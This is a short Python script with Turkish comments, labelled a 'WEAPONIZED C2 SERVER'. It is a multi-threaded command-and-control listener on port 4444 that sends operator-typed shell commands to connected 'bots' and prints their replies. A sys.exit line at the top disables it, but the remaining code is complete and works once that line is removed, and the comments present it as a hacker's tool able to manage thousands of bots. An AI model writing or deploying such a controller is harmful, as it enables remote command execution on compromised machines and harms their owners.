import socket
import threading
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod çoklu bağlantı kabul eden bir C2 Sunucusudur.")

print("--- WEAPONIZED C2 SERVER ---")

# Hacker'ın Sunucusu
BIND_IP = "0.0.0.0"
BIND_PORT = 4444

def handle_bot(client_socket, addr):
    print(f"[+] Yeni Bot Bağlandı: {addr[0]}")
    
    # Bot'a emir gönder
    while True:
        try:
            command = input(f"Shell ({addr[0]})> ")
            if command == "exit": break
            
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            print(response)
        except:
            break
    client_socket.close()

def start_server():
    # 1. SUNUCU SOKETİ (Weaponized Part)
    # Simülasyon: while True: print("Menü")
    # Gerçek: Gerçek ağ bağlantılarını dinleyen sunucu.
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((BIND_IP, BIND_PORT))
    server.listen(5)
    
    print(f"[*] C2 Sunucusu Dinliyor: {BIND_PORT} ...")
    
    while True:
        client, addr = server.accept()
        
        # Her bot için ayrı thread aç (Binlerce botu yönetebilir)
        bot_handler = threading.Thread(target=handle_bot, args=(client, addr))
        bot_handler.start()

if __name__ == "__main__":
    start_server()